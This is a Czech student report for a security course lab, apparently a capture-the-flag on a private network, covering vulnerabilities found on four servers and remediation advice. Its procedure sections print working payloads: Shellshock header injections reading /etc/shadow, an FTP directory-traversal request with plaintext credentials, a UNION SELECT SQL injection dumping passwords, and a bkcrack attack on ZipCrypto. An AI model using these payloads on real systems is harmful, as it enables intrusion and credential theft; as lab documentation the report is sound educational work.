\documentclass{article}

\usepackage[czech]{babel}
\usepackage[utf8]{inputenc}
\usepackage{enumitem}
\usepackage{hyperref}
\usepackage{listings}

\usepackage[ačpaper,top=2cm,bottom=2cm,left=3cm,right=3cm,marginparwidth=1.75cm]{geometry}

\usepackage{amsmath}
\usepackage{graphicx}
\usepackage[colorlinks=true, allcolors=blue]{hyperref}

\title{BIS - projekt}
\author{Bc. Veronika Jirmusová
}

\begin{document}
\maketitle


\section{Zmapování středozemě}
\subsection{Relevantní servery}
Poznámka k tabulce: v době, kdy jsem použila služby \textit{nmap} pro zjištění relevantních serverů, již nebyly dostupné jejich názvy. Po zjištění adres jsem se tedy dotázala hodných kolegů, zda by mi nemohli tyto názvy poskytnout, aby se mi lépe pracovalo s nápovědou. Názvy jsem tedy nezjistila sama, ale pomohli mi spolužáci, kteří si zde nepřáli být jmenováni.
\begin{table}[h!]
\centering
\resizebox{300}{!}{
\begin{tabular}{| l | l | l |}
\hline
\textbf{Název} & \textbf{IP} & \textbf{Služby} \\ 
\hline
Rivendell & 10.89.1.3 (10.89.1.156) & SSH server - port 22 \\ 
\hline
Isengard & 10.89.1.4 (10.89.1.157) & HTTP server - port 80 \\ 
\hline
Edoras & 10.89.1.5 (10.89.1.158) & FTP server - port 21 \\ 
\hline
Mirkwood & 10.89.1.6 (10.89.1.159) & HTTP server - port 80 \\ 
\hline
Admin & 10.89.1.2 (10.89.1.155) &  \\ 
\hline
\end{tabular}
}
\caption{Seznam serverů a jejich služeb}
\end{table}

\section{Nalezené zranitelnosti}
\subsection{SSH-server Rivendell}
\begin{itemize}[leftmargin=2em]
    \item \textbf{Přístup k serveru}  
    Server nebyl zranitelný žádnou konkrétní chybou, případně žádná taková zranitelnost nebyla nalezena. Přístup k serveru byl možný pouze prostřednictvím privátního RSA klíče.

    \item \textbf{Šifrovaný soubor \textit{chest.img}}  
    Na serveru byl nalezen soubor \textit{chest.img}, který byl zašifrován, pravděpodobně pomocí algoritmu \textit{ZipCrypto}. Tento algoritmus je známý svou zranitelností vůči útoku \textit{known-plaintext attack}.

\end{itemize}

\paragraph{Doporučená řešení}
\begin{itemize}[leftmargin=2em]
    \item \textbf{Použití bezpečnějšího šifrovacího algoritmu}  
    Namísto zastaralého a zranitelného algoritmu \textit{ZipCrypto} doporučuji použití modernějšího a bezpečnějšího algoritmu, jako je například \textit{AES-256}, který poskytuje výrazně vyšší úroveň zabezpečení proti známým útokům.
\end{itemize}
\subsection{HTTP-server Isengard}
Objevila jsem na tomto serveru zranitelnost známou jako \textit{Shellshock}. Tato zranitelnost umožňuje spustit libovolný příkaz na serveru prostřednictvím nesprávně validovaných HTTP hlaviček, které jsou předávány shellu \textit{bash}. 

Útočník může tímto způsobem získat vzdálený přístup k příkazové řádce serveru a provádět na něm libovolné operace, včetně čtení, mazání nebo úpravy souborů, případně získání vyšších oprávnění, což představuje kritické ohrožení systému.

\paragraph{Příčina zranitelnosti:}
Zranitelnost Shellshock je způsobena nedostatečným ošetřením vstupu v shellu \textit{bash} v kombinaci se špatně navrženým kódem webového serveru, který přímo předává obsah hlaviček do shellu.

\paragraph{Doporučení:}
\begin{itemize}
    \item \textbf{Aktualizace bash}: Okamžitě aktualizovat \textit{bash} na verzi, která již není zranitelná vůči Shellshock.
    \item \textbf{Omezení přístupu}: Omezit použití shellových skriptů pro zpracování vstupních dat, a pokud je to nutné, používat bezpečné metody pro předávání dat.
    \item \textbf{Validace vstupu}: Důsledně validovat všechny vstupy přicházející od uživatelů, a to nejen v HTTP hlavičkách, ale ve všech částech webové aplikace.
    \item \textbf{Nasazení WAF}: Použít \textit{Web Application Firewall (WAF)}, který může detekovat a blokovat podezřelé požadavky směřující na webový server.
\end{itemize}
\subsection{FTP-server Edoras}
Nalezené zranitelnosti jsem pro přehlednost rozdělila do několika bod\r u. Předpokládám, že \' utočník zná přihlašovací \' udaje.
\begin{itemize}[leftmargin=2em]
    \item \textbf{Možnost přístupu k nadřazeným složkám (Directory Traversal)}  
    Uživatel s přístupem k FTP serveru mohl získat přístup k nadřazeným složkám serveru a tím k citlivým systémovým souborům jako \texttt{/etc/passwd} a \texttt{/etc/shadow} pomocí relativních cest (\texttt{../}).  
    \textbf{Příklad útoku:}  
    \texttt{curl ftp://10.89.1.158/\%2e\%2e/\%2e\%2e/etc/passwd --user admin:iloveyou}
    
    \item \textbf{Přístup k souborům s uživatelskými daty}  
    Bylo možné získat obsah souborů \texttt{/etc/passwd} a \texttt{/etc/shadow}, které mohou obsahovat citlivé \' udaje.

    \item \textbf{Slabá konfigurace přístupových práv}  
    Uživatel „admin“ měl možnost přistupovat mimo svůj domovský adresář \texttt{/home/admin} a mohl číst systémové soubory.

\end{itemize}

\subsection*{Příčiny zranitelností}
\begin{itemize}[leftmargin=2em]
    \item \textbf{Chybějící omezení přístupu v konfiguraci FTP serveru}  
    Server umožňoval přístup mimo domovský adresář uživatele kvůli nesprávné konfiguraci, která vedla k zranitelnosti \textit{Directory Traversal}.

    \item \textbf{Nesprávně nastavená přístupová práva k systémovým souborům}  
    Systémové soubory jako \texttt{/etc/passwd} a \texttt{/etc/shadow} nebyly dostatečně chráněny před přístupem neprivilegovaných uživatelů FTP.
\end{itemize}

\subsection*{Doporučená řešení}
\begin{itemize}
    \item \textbf{Omezení přístupu pouze na domovský adresář uživatele}  
    V konfiguraci FTP serveru nastavit tzv. „chroot jail“, který uživatele omezí pouze na jeho domovský adresář.
    \item \textbf{Zákaz přístupu k citlivým systémovým souborům}  
    Ujistit se, že soubory \texttt{/etc/passwd} a \texttt{/etc/shadow} mají správně nastavena oprávnění, aby nebyly dostupné uživatelům FTP.

    \item \textbf{Použití šifrovaného přenosu dat}  
    Doporučuji použít FTPS nebo SFTP místo nezabezpečeného FTP, čímž se zajistí šifrování přenášených dat.

    \item \textbf{Pravidelný audit konfigurace a oprávnění}  
    Provádět pravidelnou kontrolu konfigurace FTP serveru a přístupových práv, aby se minimalizovala možnost zneužití zranitelností.
\end{itemize}
\subsection{HTTP-server Mirkwood}
Webový server obsahuje formulář pro nahrávání souborů přes \texttt{upload.php}, který však nedostatečně validuje vstupní data. Bylo možné obejít kontrolu typu souboru, což umožňuje nahrání potenciálně nebezpečného souboru.

Kromě toho jsem na tento server zkoušela útok typu \textit{SQL injection}, což naznačuje, že není dostatečně chráněn proti manipulaci s databázovými dotazy.

\paragraph{Doporučení:}
\begin{itemize}
    \item Důsledná kontrola typů nahrávaných souborů na straně serveru, nejen na základě přípony, ale také pomocí funkcí pro kontrolu MIME typu.
    \item Implementace \textit{Content Security Policy} (CSP), která znemožní spuštění škodlivého kódu.
    \item Zavedení přísných oprávnění pro přístup k nahraným souborům a oddělení veřejných a systémových adresářů.
    \item Ochrana proti SQL injection prostřednictvím použití připravených dotazů (\textit{prepared statements}) a ORM (Object-Relational Mapping).
\end{itemize}
\section{Postup}
\subsection*{Tajemství A}

\paragraph{Postup pro získání tajemství A:}

\begin{itemize}
    \item \textbf{Zahájení testování serveru:} Nejprve jsem provedla běžný požadavek na server, abych zjistila, zda server správně odpovídá:
    \begin{verbatim}
    curl http://10.89.1.157
    \end{verbatim}
    Server odpověděl, což znamená, že je online a připraven na připojení.

    \item \textbf{Testování zranitelnosti Shellshock:} Následně jsem využila známé zranitelnosti Shellshock k provedení vzdáleného spuštění příkazu na serveru. Poslala jsem HTTP požadavek s podvrženou hlavičkou \texttt{User-Agent}, která obsahovala škodlivý kód. Tento kód spustil příkaz \texttt{ls -la}, což způsobilo výpis souborů v adresáři:


    \begin{verbatim}
    curl -H 'User-Agent: () { :; }; echo vulnerable;
    bash -c "ls -la"' http://10.89.1.157/cgi-bin/gate
    \end{verbatim}
    Server vrátil odpověď, která potvrzuje, že zranitelnost Shellshock je přítomná a server reagoval na požadavek.

    \item \textbf{Získání citlivých informací z /etc/shadow:} V další fázi jsem použila tuto zranitelnost k získání citlivých informací z konfiguračního souboru \texttt{/etc/shadow}, který obsahuje hesla uživatelů v zašifrované podobě. Použila jsem podobný požadavek jako v předchozím kroku, ale s příkazem pro výpis souboru \texttt{/etc/shadow}:
    \begin{verbatim}
    curl -H 'User-Agent: () { :; }; echo ; 
    /bin/bash -c "cat /etc/shadow"' http://10.89.1.157/cgi-bin/gate
    \end{verbatim}
    Tento příkaz mi umožnil získat obsah souboru \texttt{/etc/shadow}, který obsahoval tajemství A:
    \begin{center}
    \texttt{Tajemstvi\_A\_3c3c26b0d80d2e0ae7bc94f850a89220dc99c710cdfac031c01063bdd698a159}
    \end{center}
\end{itemize}

\paragraph{Závěr:}
Zranitelnost Shellshock byla klíčová pro získání tajemství A. Pro efektivní zabezpečení tohoto serveru je nutné provést aktualizaci a opravy týkající se této zranitelnosti, což by zabránilo spouštění škodlivých příkazů prostřednictvím HTTP hlaviček.

\section{Tajemství B}
Při hledání tajemství D jsem objevila přihlašovací \' udaje, které šly využít pro získání tohoto tajemství, tedy:
\begin{verbatim}
<html>
  <body>
    <h2>Woodelf Items</h2>
    <ul>
      <li>{"0":1,"id":1,"1":"admin","name":"admin","2":"iloveyou","category":"iloveyou"}</li>
    </ul>
  </body>
</html>
\end{verbatim}

\begin{itemize}
  \item \textbf{Zahájení testování FTP serveru:} 
  Nejprve jsem provedla FTP požadavek na server a pokusila se přistupovat do složky \texttt{/etc/shadow}. Pro tento účel jsem použila následující příkaz:
  \begin{lstlisting}[language=bash]
    curl ftp://10.89.1.158/%2e%2e/%2e%2e/etc/shadow --user admin:iloveyou
  \end{lstlisting}
  Tento příkaz se pokusil stáhnout obsah souboru \texttt{shadow} z FTP serveru, což je soubor obsahující uživatelské účty a šifrovaná hesla.

  \item \textbf{Další testování s jiným uživatelem:}
  Po ne tolik úspěšném získání přístupu s uživatelem \texttt{admin}, jsem si všimla stejného hashe u hesla pro uživatele \texttt{theoden}. Proto jsem se tedy zkusila k serveru připojit následovně:
  \begin{lstlisting}[language=bash]
    curl ftp://10.89.1.158/%2e%2e/%2e%2e/etc/shadow --user theoden:iloveyou
  \end{lstlisting}

  \item \textbf{Zjištění přístupu k souboru \texttt{secret.txt}:}
  Po ověření přístupu k souboru \texttt{/etc/shadow} jsem provedla další krok a zjistila, že na FTP serveru je soubor \texttt{secret.txt}. Tento soubor jsem stáhla pomocí příkazu:
  \begin{lstlisting}[language=bash]
    curl ftp://10.89.1.158/secret.txt --user theoden:iloveyou
  \end{lstlisting}
  Soubor \texttt{secret.txt} obsahoval tajemství B:
  \begin{center}
    \texttt{Tajemstvi\_B\_3e898b1cea2213494669cbfcbe0a1d880535e0da356324887b3f9ca7e32d88d6}
  \end{center}
\end{itemize}

\section{Tajemství D}
\begin{itemize}
    \item \textbf{Úvod:} 
    Na serveru Mirkwood jsem provedla testování SQL injekce, abych získala citlivé informace z databáze. Cílem bylo získat přihlašovací údaje a identifikovat potenciální tajemství.

    \item \textbf{Testování SQL injekce:} 
    Použila jsem techniku SQL injekce k získání informací z databáze. Provedla jsem následující požadavek, který využívá SQL příkaz \texttt{UNION SELECT} pro sloučení výsledků dotazu na tabulku \texttt{users}. Tento dotaz umožnil získat uživatelská jména a hesla:
    \begin{verbatim}[language=bash]
    curl -v "http://10.89.1.159/list.php?id=-1%20UNION%20SELECT%201,username,
    password%20FROM%20users--"
    \end{verbatim}
    Tento požadavek využil zranitelnosti v aplikaci a umožnil přístup k citlivým údajům.

    \item \textbf{Výstup SQL injekce:}
    Po provedení injekce jsem obdržela odpověď serveru, která obsahovala následující údaje:
    \begin{quote}
    \begin{verbatim}
    <h2>Woodelf Items</h2><ul><li>{"0":1,"id":1,"1":"admin","name":
    "admin","2":"iloveyou","category":"iloveyou"}</li><li>{"0":1,"id":1,"1":"legolas"
    ,"name":
    "legolas","2":"expired","category":"expired"}</li><li>{"0":1,"id":1,"1":"thranduil"
    ,"name":
"thranduil","2":
"Tajemstvi_D_4182e9da3f669a396294d93df966c12a7a97e04e3b5147dd0ab654ce53e90395",
"category":"Tajemstvi_D_4182e9da3f669a396294d93df966c12a7a97e04e3b5147dd0ab654ce53e90395"}
</li></ul>
    \end{verbatim}
    \end{quote}
    Tento výstup obsahoval tajemství \texttt{Tajemstvi\_D} a přihlašovací \' udaje k tajemství B, které jsem dále využila (popsáno výše).

\end{itemize}

\section{Tajemství E}
\begin{itemize}
    \item \textbf{Stažení souboru:} 
    Nejprve jsem stáhla soubor \texttt{chest.img} ze serveru Rivendell, pomocí následujícího příkazu \texttt{wget}:
    \begin{lstlisting}[language=bash]
    wget 10.89.1.156/shrine/chest.img
    \end{lstlisting}

    \item \textbf{Použití nástroje \texttt{bkcrack}:} 
    Poté jsem použila nástroj \texttt{bkcrack} k dešifrování zašifrovaného souboru \texttt{extracted.zip}, konkrétně souboru \texttt{scroll.xml}, pomocí známého textu (soubor \texttt{known.txt}):
    \begin{lstlisting}[language=bash]
    bkcrack -C "extracted.zip" -c "scroll.xml" -p "known.txt"
    \end{lstlisting}
    Kde jsem do souboru \texttt{known.txt} napsala následující:
    \begin{lstlisting}
        <?xml version=",
    \end{lstlisting}
    protože je soubor \texttt{scroll.xml} s příponou \textit{.xml.}
    Po provedení útoku, \texttt{bkcrack} našel klíče pro dešifrování souboru.

    \item \textbf{Výsledek útoku:} 
    Nástroj \texttt{bkcrack} úspěšně provedl dešifrování a nalezl následující klíče:
    \begin{quote}
    \texttt{685ca420 fd16a6fa 6f2164cb}
    \end{quote}

    \item \textbf{Dešifrování souboru:} 
    S těmito klíči jsem následně dešifrovala soubor \texttt{scroll.xml}, což vedlo k odhalení tajemství E:
    \begin{center}
    \texttt{Tajemstvi\_E\_5fd2090b1d9ca5b47a19978127fc5d38305cae2ad1c83dd382f7c5243cfe4d4d}
    \end{center}
\end{itemize}


\end{document}